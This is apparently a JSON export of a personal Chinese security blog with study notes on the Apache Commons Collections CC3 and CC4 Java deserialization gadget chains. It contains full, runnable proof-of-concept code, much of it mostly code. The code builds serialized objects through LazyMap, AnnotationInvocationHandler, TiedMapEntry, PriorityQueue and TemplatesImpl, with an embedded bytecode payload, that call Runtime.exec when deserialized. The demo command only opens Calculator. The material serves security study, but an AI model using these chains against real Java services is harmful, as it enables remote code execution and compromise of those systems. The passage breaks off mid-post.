{"meta":{"title":"个人博客","subtitle":"","description":"个人学习的一些记录。","author":"f19t","url":"https://f19t.github.io.git","root":"/"},"pages":[{"title":"分类","date":"2023-02-12T08:31:42.000Z","updated":"2023-02-13T09:31:55.647Z","comments":true,"path":"categories/index.html","permalink":"https://f19t.github.io.git/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-02-12T08:25:34.000Z","updated":"2023-02-13T09:31:47.571Z","comments":true,"path":"tags/index.html","permalink":"https://f19t.github.io.git/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"CC4基础知识","slug":"CC4基础知识","date":"2023-02-26T14:05:27.000Z","updated":"2023-02-26T14:06:11.955Z","comments":true,"path":"2023/02/26/CC4基础知识/","link":"","permalink":"https://f19t.github.io.git/2023/02/26/CC4%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"CC4基础知识简单整理一下CC4利用链用到的基础知识。","text":"CC4基础知识简单整理一下CC4利用链用到的基础知识。 ComparatorComparator是一个接口，用来实现集合中元素的比较、排序. 1public interface Comparator&lt;T&gt; &#123;&#125; PriorityQueuePriorityQueue是java自带的的一种数据结构，其自带readObject方法，调用了 heapify() 。 12345678910111213141516171819private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size); queue = new Object[size]; // Read in all elements. for (int i = 0; i &lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in &quot;proper order&quot;, but the // spec has never explained what that might be. heapify();//调用点&#125; 其heapify()中有调用了 siftDown 方法。 1234private void heapify() &#123; for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--) siftDown(i, (E) queue[i]); &#125; 当被比较集合不为空时，其siftDown又调用了siftDownUsingComparator方法。 123456private void siftDown(int k, E x) &#123; if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x); &#125; siftDownUsingComparator又调用了，集合的compare方法。 12345678910111213141516private void siftDownUsingComparator(int k, E x) &#123; int half = size &gt;&gt;&gt; 1; while (k &lt; half) &#123; int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0) c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; &#125; queue[k] = x; &#125; 其构造函数的参数为int和实现Comparator接口的的对象。 123456789public PriorityQueue(int initialCapacity, Comparator&lt;? super E&gt; comparator) &#123; // Note: This restriction of at least one is not actually needed, // but continues for 1.5 compatibility if (initialCapacity &lt; 1) throw new IllegalArgumentException(); this.queue = new Object[initialCapacity]; this.comparator = comparator; &#125; TransformingComparatorTransformingComparator是实现Comparator接口的类。 1public class TransformingComparator&lt;I, O&gt; implements Comparator&lt;I&gt;, Serializable &#123; 其构造函数接收接口Transformer的对象。 123public TransformingComparator(Transformer&lt;? super I, ? extends O&gt; transformer) &#123; this(transformer, ComparatorUtils.NATURAL_COMPARATOR); &#125; 其compare方法，实现了对transform的调用。 12345public int compare(I obj1, I obj2) &#123; O value1 = this.transformer.transform(obj1); O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2); &#125; 有了上述CC4的基础知识，我们就可以构造出CC2这条链。 注意: 一开始放的的假的命令执行transformer是必须的，因为PriorityQueue的add方法会调用offer，offer又会调用siftUp方法，siftUp又会调用siftUpUsingComparator，siftUpUsingComparator又会调用comparator.compare，导致命令提前执行，并报错。 1234567891011121314151617181920212223242526272829303132333435363738import java.io.*;import java.util.PriorityQueue;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;import static ysoserial.payloads.util.Reflections.setFieldValue;/** * author: f19t * Date: 2023/2/26 21:21 */public class Test_PriorityQueue &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; //定义一个命令执行的transformers数组 new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; Transformer[] transformer = new Transformer[] &#123;new ConstantTransformer(1)&#125;; Transformer transformerchain = new ChainedTransformer(transformer); TransformingComparator comparator = new TransformingComparator(transformerchain); PriorityQueue queue = new PriorityQueue(4, comparator); queue.add(1); queue.add(2); setFieldValue(transformerchain, &quot;iTransformers&quot;, transformers);//需要替换为正确的 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); &#125;&#125;","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"}]},{"title":"CC3基础知识","slug":"CC3基础知识","date":"2023-02-25T11:45:30.000Z","updated":"2023-02-25T11:59:01.570Z","comments":true,"path":"2023/02/25/CC3基础知识/","link":"","permalink":"https://f19t.github.io.git/2023/02/25/CC3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"CC3基础知识简单总结一下cc3用到的基础知识。","text":"CC3基础知识简单总结一下cc3用到的基础知识。 TransformerTransformer是一个接口，其transform，是一个待实现的方法。 123public interface Transformer &#123; Object transform(Object var1);&#125; InvokerTransformerInvokerTransformer是实现了Transformer接口的具体类，其transform方法是通过反射去执行方法。 12345public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; &#125; 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var5) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException var6) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException var7) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, var7); &#125; &#125; &#125; 测试代码，执行以下代码可弹计算机。 1234567891011121314import org.apache.commons.collections.functors.InvokerTransformer;/** * author: f19t * Date: 2023/2/25 16:19 */public class Test_InvokerTransformer &#123; public static void main(String[] args) &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;new String(&quot;open /System/Applications/Calculator.app&quot;)&#125;); invokerTransformer.transform(java.lang.Runtime.getRuntime()); &#125;&#125; ConstantTransformerConstantTransformer是实现了Transformer接口的具体类，其transform方法是返回输入的对象。 1234567public ConstantTransformer(Object constantToReturn) &#123; this.iConstant = constantToReturn; &#125; public Object transform(Object input) &#123; return this.iConstant; &#125; 因为ConstantTransformer构造函数参数可控，所以我们可以通过transform获取我们的对象。 123456789101112131415import org.apache.commons.collections.functors.ConstantTransformer;/** * author: f19t * Date: 2023/2/25 16:29 */public class Test_ConstantTransformer &#123; public static void main(String[] args) &#123; String s = new String(&quot;1&quot;); ConstantTransformer constantTransformer = new ConstantTransformer(s); String a = (String) constantTransformer.transform(null); System.out.println(s.equals(a)); &#125;&#125; 1true ChainedTransformerChainedTransformer是实现了Transformer接口的具体类，其Transform方法是依次按顺序调用transform数组内的Transform变量的transform方法。 1234567891011public ChainedTransformer(Transformer[] transformers) &#123; this.iTransformers = transformers; &#125; public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; object = this.iTransformers[i].transform(object); &#125; return object; &#125; 测试以下代码可以成功弹计算机。 123456789101112131415161718192021import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;/** * author: f19t * Date: 2023/2/25 16:39 */public class Test_ChainedTransformer &#123; public static void main(String[] args) &#123; Transformer[] transformers = new Transformer[]&#123; //定义一个命令执行的transformers数组 new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(null); &#125;&#125; LazyMapLazyMap的decorate()方法接收两个参数，(Map map, Transformer factory)。 123public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory); &#125; 并且当map.containsKey(key)&#x3D;&#x3D;null时，其get方法会调用factory.transform(key)方法。 123456789public Object get(Object key) &#123; if (!super.map.containsKey(key)) &#123; Object value = this.factory.transform(key); super.map.put(key, value); return value; &#125; else &#123; return super.map.get(key); &#125; &#125; InvocationHandler动态代理实现接口的类，如果使用动态代理，执行任意方法都会执行动态代理的invoke方法。 12public Object invoke(Object proxy, Method method, Object[] args) throws Throwable; AnnotationInvocationHandlerAnnotationInvocationHandler是一个动态代理程序，其有两个参数，Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2,一个参数是集成Annotation的类，另一个是Map对象。 12345678class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123; AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123; this.memberValues = var2; &#125; public Object invoke(Object var1, Method var2, Object[] var3) &#123; Object var6 = this.memberValues.get(var4);//关键代码 &#125;&#125; 测试代码，执行任意命令都可弹计算器。 1234567891011121314151617181920212223242526272829303132333435363738394041import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.lang.annotation.Annotation;import java.lang.annotation.Retention;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;/** * author: f19t * Date: 2023/2/25 17:06 */public class Test_AnnotationInvocationHandler &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap=new HashMap(); Map outerMap= LazyMap.decorate(innerMap,transformerChain);// outerMap.get(&quot;1&quot;); Class c1 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor construct = c1.getDeclaredConstructor(Class.class,Map.class); construct.setAccessible(true); InvocationHandler handler=(InvocationHandler) construct.newInstance(Target.class, outerMap);//参数一，只要继承Annotation的类都可以 Map proxyMap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] &#123;Map.class&#125;, handler); proxyMap.clear();//执行任意命令都可弹计算器 &#125;&#125; 反序列化demo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.lang.annotation.Annotation;import java.lang.annotation.Retention;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;import java.io.*;/** * author: f19t * Date: 2023/2/25 17:06 */public class Test_AnnotationInvocationHandler &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap=new HashMap(); Map outerMap= LazyMap.decorate(innerMap,transformerChain);// outerMap.get(&quot;1&quot;); Class c1 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor construct = c1.getDeclaredConstructor(Class.class,Map.class); construct.setAccessible(true); InvocationHandler handler=(InvocationHandler) construct.newInstance(Target.class, outerMap);//参数一，只要继承Annotation的类都可以 Map proxyMap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] &#123;Map.class&#125;, handler);// proxyMap.clear();//执行任意命令都可弹计算器 handler = (InvocationHandler) construct.newInstance(Target.class, proxyMap); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); &#125;&#125; 注意，反序列化时，高版本AnnotationInvocationHandler的LazyMap，变成了LinkedHashMap，所以上面POC无法在高版本命令执行。 TiedMapEntry其hashCode方法调用getValue方法，getValue方法里面有存在map.get方法。 1234567public int hashCode() &#123; Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125;public Object getValue() &#123; return this.map.get(this.key); &#125; 以下测试代码弹计算机 123456789101112131415161718192021222324252627import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.util.HashMap;import java.util.Map;/** * author: f19t * Date: 2023/2/25 18:09 */public class Test_TiedMapEntry &#123; public static void main(String[] args) &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap=new HashMap(); Map outerMap= LazyMap.decorate(innerMap,transformerChain); TiedMapEntry tt=new TiedMapEntry(outerMap,&quot;tt&quot;); tt.hashCode(); &#125;&#125; 反序列化测试代码，注意：回弹两遍计算机，因为hashmap的readObject的putVal会调用hash方法，里面调用了hashcode，进而调用get，触发了命令执行。 1234567891011121314151617181920212223242526272829303132333435363738394041424344import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;/** * author: f19t * Date: 2023/2/25 18:09 */public class Test_TiedMapEntry &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123; Transformer[] fake = new Transformer[]&#123;new ConstantTransformer(1)&#125;; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; Transformer transformerChain = new ChainedTransformer(fake); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry tt = new TiedMapEntry(outerMap, &quot;tt&quot;); Map expMap = new HashMap(); expMap.put(tt, &quot;yy&quot;); Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); f.setAccessible(true); f.set(transformerChain, transformers); outerMap.clear(); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object) ois.readObject(); &#125;&#125; TrAXFilterTrAXFilter会执行传入的templates的newTransformer方法。 123public TrAXFilter(Templates templates) throws TransformerConfigurationException_transformer = (TransformerImpl) templates.newTransformer(); 测试代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100package ysoserial;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import static ysoserial.payloads.util.Reflections.setFieldValue;/** * author: f19t * Date: 2023/2/25 19:03 */public class Test_TrAXFilter &#123; public static void main(String[] args) throws Exception &#123; byte[] testClassBytes = new byte[]&#123;-54 ,-2 ,-70 ,-66 ,0 ,0 ,0 ,52 ,0 ,47 ,10 ,0 ,9 ,0 ,22 , 10 ,0 ,23 ,0 ,24 ,8 ,0 ,25 ,10 ,0 ,23 ,0 ,26 ,9 ,0 , 27 ,0 ,28 ,8 ,0 ,29 ,10 ,0 ,30 ,0 ,31 ,7 ,0 ,32 ,7 , 0 ,33 ,1 ,0 ,9 ,116 ,114 ,97 ,110 ,115 ,102 ,111 ,114 ,109 ,1 , 0 ,114 ,40 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 , 47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 , 110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,120 ,115 ,108 ,116 ,99 ,47 ,68 , 79 ,77 ,59 ,91 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 , 103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,109 ,108 ,47 ,105 ,110 , 116 ,101 ,114 ,110 ,97 ,108 ,47 ,115 ,101 ,114 ,105 ,97 ,108 ,105 ,122 , 101 ,114 ,47 ,83 ,101 ,114 ,105 ,97 ,108 ,105 ,122 ,97 ,116 ,105 ,111 , 110 ,72 ,97 ,110 ,100 ,108 ,101 ,114 ,59 ,41 ,86 ,1 ,0 ,4 ,67 , 111 ,100 ,101 ,1 ,0 ,15 ,76 ,105 ,110 ,101 ,78 ,117 ,109 ,98 ,101 , 114 ,84 ,97 ,98 ,108 ,101 ,1 ,0 ,10 ,69 ,120 ,99 ,101 ,112 ,116 , 105 ,111 ,110 ,115 ,7 ,0 ,34 ,1 ,0 ,-90 ,40 ,76 ,99 ,111 ,109 , 47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 , 47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 , 47 ,120 ,115 ,108 ,116 ,99 ,47 ,68 ,79 ,77 ,59 ,76 ,99 ,111 ,109 , 47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 , 47 ,120 ,109 ,108 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,100 , 116 ,109 ,47 ,68 ,84 ,77 ,65 ,120 ,105 ,115 ,73 ,116 ,101 ,114 ,97 , 116 ,111 ,114 ,59 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 , 103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,109 ,108 ,47 ,105 ,110 , 116 ,101 ,114 ,110 ,97 ,108 ,47 ,115 ,101 ,114 ,105 ,97 ,108 ,105 ,122 , 101 ,114 ,47 ,83 ,101 ,114 ,105 ,97 ,108 ,105 ,122 ,97 ,116 ,105 ,111 , 110 ,72 ,97 ,110 ,100 ,108 ,101 ,114 ,59 ,41 ,86 ,1 ,0 ,6 ,60 , 105 ,110 ,105 ,116 ,62 ,1 ,0 ,3 ,40 ,41 ,86 ,7 ,0 ,35 ,1 , 0 ,10 ,83 ,111 ,117 ,114 ,99 ,101 ,70 ,105 ,108 ,101 ,1 ,0 ,23 , 72 ,101 ,108 ,108 ,111 ,84 ,101 ,109 ,112 ,108 ,97 ,116 ,101 ,115 ,73 , 109 ,112 ,108 ,46 ,106 ,97 ,118 ,97 ,12 ,0 ,17 ,0 ,18 ,7 ,0 , 36 ,12 ,0 ,37 ,0 ,38 ,1 ,0 ,40 ,111 ,112 ,101 ,110 ,32 ,47 , 83 ,121 ,115 ,116 ,101 ,109 ,47 ,65 ,112 ,112 ,108 ,105 ,99 ,97 ,116 , 105 ,111 ,110 ,115 ,47 ,67 ,97 ,108 ,99 ,117 ,108 ,97 ,116 ,111 ,114 , 46 ,97 ,112 ,112 ,12 ,0 ,39 ,0 ,40 ,7 ,0 ,41 ,12 ,0 ,42 , 0 ,43 ,1 ,0 ,19 ,72 ,101 ,108 ,108 ,111 ,32 ,84 ,101 ,109 ,112 , 108 ,97 ,116 ,101 ,115 ,73 ,109 ,112 ,108 ,7 ,0 ,44 ,12 ,0 ,45 , 0 ,46 ,1 ,0 ,28 ,121 ,115 ,111 ,115 ,101 ,114 ,105 ,97 ,108 ,47 , 72 ,101 ,108 ,108 ,111 ,84 ,101 ,109 ,112 ,108 ,97 ,116 ,101 ,115 ,73 , 109 ,112 ,108 ,1 ,0 ,64 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 , 114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,97 ,108 ,97 ,110 , 47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,120 ,115 ,108 ,116 ,99 , 47 ,114 ,117 ,110 ,116 ,105 ,109 ,101 ,47 ,65 ,98 ,115 ,116 ,114 ,97 , 99 ,116 ,84 ,114 ,97 ,110 ,115 ,108 ,101 ,116 ,1 ,0 ,57 ,99 ,111 , 109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 , 101 ,47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 , 108 ,47 ,120 ,115 ,108 ,116 ,99 ,47 ,84 ,114 ,97 ,110 ,115 ,108 ,101 , 116 ,69 ,120 ,99 ,101 ,112 ,116 ,105 ,111 ,110 ,1 ,0 ,19 ,106 ,97 , 118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,69 ,120 ,99 ,101 ,112 ,116 ,105 , 111 ,110 ,1 ,0 ,17 ,106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 , 82 ,117 ,110 ,116 ,105 ,109 ,101 ,1 ,0 ,10 ,103 ,101 ,116 ,82 ,117 , 110 ,116 ,105 ,109 ,101 ,1 ,0 ,21 ,40 ,41 ,76 ,106 ,97 ,118 ,97 , 47 ,108 ,97 ,110 ,103 ,47 ,82 ,117 ,110 ,116 ,105 ,109 ,101 ,59 ,1 , 0 ,4 ,101 ,120 ,101 ,99 ,1 ,0 ,39 ,40 ,76 ,106 ,97 ,118 ,97 , 47 ,108 ,97 ,110 ,103 ,47 ,83 ,116 ,114 ,105 ,110 ,103 ,59 ,41 ,76 , 106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,80 ,114 ,111 ,99 ,101 , 115 ,115 ,59 ,1 ,0 ,16 ,106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 , 47 ,83 ,121 ,115 ,116 ,101 ,109 ,1 ,0 ,3 ,111 ,117 ,116 ,1 ,0 , 21 ,76 ,106 ,97 ,118 ,97 ,47 ,105 ,111 ,47 ,80 ,114 ,105 ,110 ,116 , 83 ,116 ,114 ,101 ,97 ,109 ,59 ,1 ,0 ,19 ,106 ,97 ,118 ,97 ,47 , 105 ,111 ,47 ,80 ,114 ,105 ,110 ,116 ,83 ,116 ,114 ,101 ,97 ,109 ,1 , 0 ,7 ,112 ,114 ,105 ,110 ,116 ,108 ,110 ,1 ,0 ,21 ,40 ,76 ,106 , 97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,83 ,116 ,114 ,105 ,110 ,103 , 59 ,41 ,86 ,0 ,33 ,0 ,8 ,0 ,9 ,0 ,0 ,0 ,0 ,0 ,3 , 0 ,1 ,0 ,10 ,0 ,11 ,0 ,2 ,0 ,12 ,0 ,0 ,0 ,25 ,0 , 0 ,0 ,3 ,0 ,0 ,0 ,1 ,-79 ,0 ,0 ,0 ,1 ,0 ,13 ,0 , 0 ,0 ,6 ,0 ,1 ,0 ,0 ,0 ,14 ,0 ,14 ,0 ,0 ,0 ,4 , 0 ,1 ,0 ,15 ,0 ,1 ,0 ,10 ,0 ,16 ,0 ,2 ,0 ,12 ,0 , 0 ,0 ,25 ,0 ,0 ,0 ,4 ,0 ,0 ,0 ,1 ,-79 ,0 ,0 ,0 , 1 ,0 ,13 ,0 ,0 ,0 ,6 ,0 ,1 ,0 ,0 ,0 ,16 ,0 ,14 , 0 ,0 ,0 ,4 ,0 ,1 ,0 ,15 ,0 ,1 ,0 ,17 ,0 ,18 ,0 , 2 ,0 ,12 ,0 ,0 ,0 ,58 ,0 ,2 ,0 ,2 ,0 ,0 ,0 ,22 , 42 ,-73 ,0 ,1 ,-72 ,0 ,2 ,18 ,3 ,-74 ,0 ,4 ,76 ,-78 ,0 , 5 ,18 ,6 ,-74 ,0 ,7 ,-79 ,0 ,0 ,0 ,1 ,0 ,13 ,0 ,0 , 0 ,18 ,0 ,4 ,0 ,0 ,0 ,18 ,0 ,4 ,0 ,19 ,0 ,13 ,0 , 20 ,0 ,21 ,0 ,21 ,0 ,14 ,0 ,0 ,0 ,4 ,0 ,1 ,0 ,19 , 0 ,1 ,0 ,20 ,0 ,0 ,0 ,2 ,0 ,21 ,&#125;; TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;testClassBytes&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); TrAXFilter trAXFilter = new TrAXFilter(obj); &#125;&#125; HelloTemplatesImpl的代码 123456789101112131415161718192021import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public classHelloTemplatesImpl extends AbstractTranslet &#123; public void transform(DOM document, SerializationHandler[] handlers)throws TransletException &#123;&#125; public void transform(DOM document, DTMAxisIterator iterator,SerializationHandler handler) throws TransletException &#123;&#125; public HelloTemplatesImpl() throws Exception &#123; super(); Process p = Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); System.out.println(&quot;Hello TemplatesImpl&quot;); &#125;&#125; InstantiateTransformerInstantiateTransformer的transform方法会执行传入类的构造函数。 12345678public Object transform(Object input) &#123; try &#123; if (!(input instanceof 